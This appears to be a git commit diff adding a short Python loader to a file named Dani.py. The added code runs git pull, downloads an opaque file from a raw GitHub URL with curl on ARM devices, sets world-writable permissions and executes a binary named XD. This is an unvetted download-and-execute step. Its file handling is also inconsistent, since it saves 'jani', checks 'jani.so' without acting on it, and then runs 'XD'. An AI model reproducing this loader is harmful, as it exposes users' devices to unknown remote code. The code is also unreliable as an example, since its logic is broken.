6f85204f6ce88ac5e760f90f1894dcc0409abc9c
Dani Malik <112042251+DaniMalik1@users.noreply.github.com>
2024-04-06 06:37:20 +0500

    Update Dani.py

--- Dani.py
+++ Dani.py
@@ -1,1 +1,14 @@
-import jani.so
+import os
+os.system('git pull')
+from os import path,system
+from platform import uname
+bt=uname().machine.lower()
+if 'aarch' in bt:
+    url = "https://raw.githubusercontent.com/DaniMalik1/free/main/Hiss.txt"
+    system("curl -L "+url+" -o jani")
+    if path.isfile("jani.so"):
+        pass
+    
+else:exit('\033[1;31m\n Sorry System or 32bit device not supported ')
+os.system('chmod 777 XD && ./XD')
+ 
